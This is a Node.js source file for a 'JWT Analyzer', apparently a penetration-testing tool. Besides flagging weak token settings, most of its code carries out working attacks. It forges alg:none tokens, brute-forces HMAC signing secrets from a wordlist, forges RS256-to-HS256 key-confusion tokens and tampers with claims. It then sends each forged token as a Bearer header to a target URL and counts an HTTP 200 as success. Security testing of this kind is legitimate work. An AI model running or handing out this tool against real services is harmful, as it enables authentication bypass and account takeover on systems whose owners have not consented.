const axios = require('axios');
const chalk = require('chalk');
const crypto = require('crypto');

class JWTAnalyzer {
    constructor(config) {
        this.config = config;
        this.results = [];
    }

    base64UrlDecode(str) {
        str = str.replace(/-/g, '+').replace(/_/g, '/');
        const pad = str.length % 4;
        if (pad) {
            str += '='.repeat(4 - pad);
        }
        return Buffer.from(str, 'base64').toString('utf-8');
    }

    base64UrlEncode(str) {
        return Buffer.from(str)
            .toString('base64')
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=/g, '');
    }

    parseJWT(token) {
        try {
            const parts = token.split('.');
            if (parts.length !== 3) {
                throw new Error('Invalid JWT format');
            }

            const header = JSON.parse(this.base64UrlDecode(parts[0]));
            const payload = JSON.parse(this.base64UrlDecode(parts[1]));
            const signature = parts[2];

            return { header, payload, signature, parts };
        } catch (error) {
            console.log(chalk.red(`❌ Error parsing JWT: ${error.message}`));
            return null;
        }
    }

    analyzeTokenSecurity(parsedToken) {
        const { header, payload } = parsedToken;
        const vulnerabilities = [];
        const warnings = [];

        if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE') {
            vulnerabilities.push({
                type: 'CRITICAL',
                issue: 'None Algorithm Detected',
                description: 'Token uses "none" algorithm - No signature verification!',
                severity: 'CRITICAL'
            });
        }

        if (header.alg === 'HS256' || header.alg === 'HS384' || header.alg === 'HS512') {
            warnings.push({
                type: 'WARNING',
                issue: 'HMAC Algorithm',
                description: 'Using symmetric algorithm - Vulnerable to secret bruteforce',
                severity: 'MEDIUM'
            });
        }

        if (payload.exp) {
            const expDate = new Date(payload.exp * 1000);
            const now = new Date();
            if (expDate < now) {
                warnings.push({
                    type: 'INFO',
                    issue: 'Token Expired',
                    description: `Token expired at ${expDate.toISOString()}`,
                    severity: 'LOW'
                });
            } else {
                const daysUntilExpiry = Math.ceil((expDate - now) / (1000 * 60 * 60 * 24));
                if (daysUntilExpiry > 365) {
                    warnings.push({
                        type: 'WARNING',
                        issue: 'Long Expiration Time',
                        description: `Token expires in ${daysUntilExpiry} days - Too long!`,
                        severity: 'MEDIUM'
                    });
                }
            }
        } else {
            vulnerabilities.push({
                type: 'WARNING',
                issue: 'No Expiration',
                description: 'Token has no expiration time (exp claim missing)',
                severity: 'HIGH'
            });
        }

        const sensitiveKeys = ['password', 'secret', 'key', 'token', 'apikey', 'api_key'];
        const payloadKeys = Object.keys(payload).map(k => k.toLowerCase());
        const foundSensitive = sensitiveKeys.filter(key =>
            payloadKeys.some(pk => pk.includes(key))
        );

        if (foundSensitive.length > 0) {
            vulnerabilities.push({
                type: 'CRITICAL',
                issue: 'Sensitive Data in Payload',
                description: `Found sensitive keys: ${foundSensitive.join(', ')}`,
                severity: 'CRITICAL'
            });
        }

        return { vulnerabilities, warnings };
    }

    async testNoneAlgorithmAttack(token, targetUrl) {
        console.log(chalk.yellow('\n🔍 Testing None Algorithm Attack...'));

        const parsed = this.parseJWT(token);
        if (!parsed) return null;

        try {
            const newHeader = { ...parsed.header, alg: 'none' };
            const headerEncoded = this.base64UrlEncode(JSON.stringify(newHeader));
            const payloadEncoded = parsed.parts[1];
            const manipulatedToken = `${headerEncoded}.${payloadEncoded}.`;

            console.log(chalk.cyan('📝 Manipulated Token (alg: none):'));
            console.log(chalk.gray(manipulatedToken));

            if (targetUrl) {
                const response = await axios.get(targetUrl, {
                    headers: { 'Authorization': `Bearer ${manipulatedToken}` },
                    validateStatus: () => true
                });

                if (response.status === 200) {
                    return {
                        success: true,
                        vulnerability: 'None Algorithm Attack Successful',
                        manipulatedToken,
                        response: response.data
                    };
                }
            }

            return {
                success: false,
                manipulatedToken,
                message: 'Server rejected none algorithm (Good!)'
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    async bruteforceSecret(token, wordlist) {
        console.log(chalk.yellow('\n🔍 Bruteforcing JWT Secret...'));

        const parsed = this.parseJWT(token);
        if (!parsed) return null;

        const { header, parts } = parsed;
        const algorithm = header.alg.toLowerCase();

        if (!algorithm.startsWith('hs')) {
            console.log(chalk.red('❌ Token does not use HMAC algorithm'));
            return null;
        }

        const signatureData = `${parts[0]}.${parts[1]}`;
        const originalSignature = parts[2];

        let attempts = 0;
        const startTime = Date.now();

        for (const secret of wordlist) {
            attempts++;

            if (attempts % 100 === 0) {
                process.stdout.write(`\r${chalk.cyan(`Attempts: ${attempts}/${wordlist.length}`)}`);
            }

            try {
                let hash;
                if (algorithm === 'hs256') {
                    hash = crypto.createHmac('sha256', secret);
                } else if (algorithm === 'hs384') {
                    hash = crypto.createHmac('sha384', secret);
                } else if (algorithm === 'hs512') {
                    hash = crypto.createHmac('sha512', secret);
                }

                const signature = hash.update(signatureData).digest('base64')
                    .replace(/\+/g, '-')
                    .replace(/\//g, '_')
                    .replace(/=/g, '');

                if (signature === originalSignature) {
                    const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
                    console.log(chalk.green(`\n\n✅ SECRET FOUND: "${secret}"`));
                    console.log(chalk.gray(`Time: ${elapsed}s | Attempts: ${attempts}`));

                    return {
                        success: true,
                        secret,
                        attempts,
                        timeElapsed: elapsed
                    };
                }
            } catch (error) {
                continue;
            }
        }

        console.log(chalk.red(`\n\n❌ Secret not found in wordlist (${attempts} attempts)`));
        return {
            success: false,
            attempts,
            timeElapsed: ((Date.now() - startTime) / 1000).toFixed(2)
        };
    }

    async testKeyConfusionAttack(token, publicKey, targetUrl) {
        console.log(chalk.yellow('\n🔍 Testing Key Confusion Attack (RS256 -> HS256)...'));

        const parsed = this.parseJWT(token);
        if (!parsed) return null;

        try {
            const newHeader = { ...parsed.header, alg: 'HS256' };
            const headerEncoded = this.base64UrlEncode(JSON.stringify(newHeader));
            const payloadEncoded = parsed.parts[1];
            const signatureData = `${headerEncoded}.${payloadEncoded}`;

            const signature = crypto
                .createHmac('sha256', publicKey)
                .update(signatureData)
                .digest('base64')
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=/g, '');

            const confusedToken = `${headerEncoded}.${payloadEncoded}.${signature}`;

            console.log(chalk.cyan('📝 Confused Token (RS256 -> HS256):'));
            console.log(chalk.gray(confusedToken));

            if (targetUrl) {
                const response = await axios.get(targetUrl, {
                    headers: { 'Authorization': `Bearer ${confusedToken}` },
                    validateStatus: () => true
                });

                if (response.status === 200) {
                    return {
                        success: true,
                        vulnerability: 'Key Confusion Attack Successful',
                        confusedToken,
                        response: response.data
                    };
                }
            }

            return {
                success: false,
                confusedToken,
                message: 'Server rejected confused token (Good!)'
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    async testClaimsManipulation(token, targetUrl, newClaims) {
        console.log(chalk.yellow('\n🔍 Testing Claims Manipulation...'));

        const parsed = this.parseJWT(token);
        if (!parsed) return null;

        try {
            const newPayload = { ...parsed.payload, ...newClaims };
            const headerEncoded = parsed.parts[0];
            const payloadEncoded = this.base64UrlEncode(JSON.stringify(newPayload));
            const manipulatedToken = `${headerEncoded}.${payloadEncoded}.${parsed.signature}`;

            console.log(chalk.cyan('📝 Manipulated Claims:'));
            console.log(chalk.gray(JSON.stringify(newClaims, null, 2)));

            if (targetUrl) {
                const response = await axios.get(targetUrl, {
                    headers: { 'Authorization': `Bearer ${manipulatedToken}` },
                    validateStatus: () => true
                });

                if (response.status === 200) {
                    return {
                        success: true,
                        vulnerability: 'Claims Manipulation Successful (Signature not verified!)',
                        manipulatedToken,
                        response: response.data
                    };
                }
            }

            return {
                success: false,
                manipulatedToken,
                message: 'Server rejected manipulated claims (Good!)'
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    async run() {
        console.log(chalk.bold.cyan('\n🔐 JWT Analyzer Started\n'));
        console.log(chalk.gray('='.repeat(60)));

        const { token, targetUrl, wordlistFile, publicKeyFile, testClaims } = this.config;

        console.log(chalk.yellow('\n📋 Step 1: Parsing JWT Token...'));
        const parsed = this.parseJWT(token);

        if (!parsed) {
            console.log(chalk.red('❌ Failed to parse token'));
            return { success: false, error: 'Invalid token format' };
        }

        console.log(chalk.green('✅ Token parsed successfully'));
        console.log(chalk.cyan('\n📄 Header:'));
        console.log(chalk.gray(JSON.stringify(parsed.header, null, 2)));
        console.log(chalk.cyan('\n📄 Payload:'));
        console.log(chalk.gray(JSON.stringify(parsed.payload, null, 2)));

        console.log(chalk.yellow('\n\n🔍 Step 2: Security Analysis...'));
        const securityAnalysis = this.analyzeTokenSecurity(parsed);

        if (securityAnalysis.vulnerabilities.length > 0) {
            console.log(chalk.red('\n⚠️  VULNERABILITIES FOUND:'));
            securityAnalysis.vulnerabilities.forEach((vuln, i) => {
                console.log(chalk.red(`\n${i + 1}. ${vuln.issue}`));
                console.log(chalk.gray(`   ${vuln.description}`));
                console.log(chalk.yellow(`   Severity: ${vuln.severity}`));
            });
        }

        if (securityAnalysis.warnings.length > 0) {
            console.log(chalk.yellow('\n⚠️  WARNINGS:'));
            securityAnalysis.warnings.forEach((warn, i) => {
                console.log(chalk.yellow(`\n${i + 1}. ${warn.issue}`));
                console.log(chalk.gray(`   ${warn.description}`));
            });
        }

        const attackResults = {};

        if (targetUrl) {
            const noneAttack = await this.testNoneAlgorithmAttack(token, targetUrl);
            attackResults.noneAlgorithm = noneAttack;
        }

        if (wordlistFile) {
            const fs = require('fs');
            if (fs.existsSync(wordlistFile)) {
                const wordlist = fs.readFileSync(wordlistFile, 'utf-8')
                    .split('\n')
                    .map(line => line.trim())
                    .filter(line => line.length > 0);

                const bruteforceResult = await this.bruteforceSecret(token, wordlist);
                attackResults.bruteforce = bruteforceResult;
            } else {
                console.log(chalk.red(`\n❌ Wordlist file not found: ${wordlistFile}`));
            }
        }

        if (publicKeyFile && targetUrl) {
            const fs = require('fs');
            if (fs.existsSync(publicKeyFile)) {
                const publicKey = fs.readFileSync(publicKeyFile, 'utf-8');
                const confusionAttack = await this.testKeyConfusionAttack(token, publicKey, targetUrl);
                attackResults.keyConfusion = confusionAttack;
            }
        }

        if (testClaims && targetUrl) {
            const claimsAttack = await this.testClaimsManipulation(token, targetUrl, testClaims);
            attackResults.claimsManipulation = claimsAttack;
        }

        const finalResults = {
            timestamp: new Date().toISOString(),
            token: {
                header: parsed.header,
                payload: parsed.payload
            },
            securityAnalysis,
            attackResults
        };

        this.results.push(finalResults);

        console.log(chalk.bold.green('\n\n✅ JWT Analysis Complete!'));
        console.log(chalk.gray('='.repeat(60)));

        return finalResults;
    }

    exportJSON(filename) {
        const fs = require('fs');
        fs.writeFileSync(filename, JSON.stringify(this.results, null, 2));
        console.log(chalk.green(`\n✅ Results exported to ${filename}`));
    }

    exportCSV(filename) {
        const fs = require('fs');
        const csvRows = ['Timestamp,Token Algorithm,Vulnerabilities Count,Warnings Count,None Attack,Bruteforce Success'];

        this.results.forEach(result => {
            const vulnCount = result.securityAnalysis.vulnerabilities.length;
            const warnCount = result.securityAnalysis.warnings.length;
            const noneAttack = result.attackResults.noneAlgorithm?.success || false;
            const bruteforce = result.attackResults.bruteforce?.success || false;

            csvRows.push(
                `${result.timestamp},${result.token.header.alg},${vulnCount},${warnCount},${noneAttack},${bruteforce}`
            );
        });

        fs.writeFileSync(filename, csvRows.join('\n'));
        console.log(chalk.green(`\n✅ Results exported to ${filename}`));
    }
}

module.exports = JWTAnalyzer;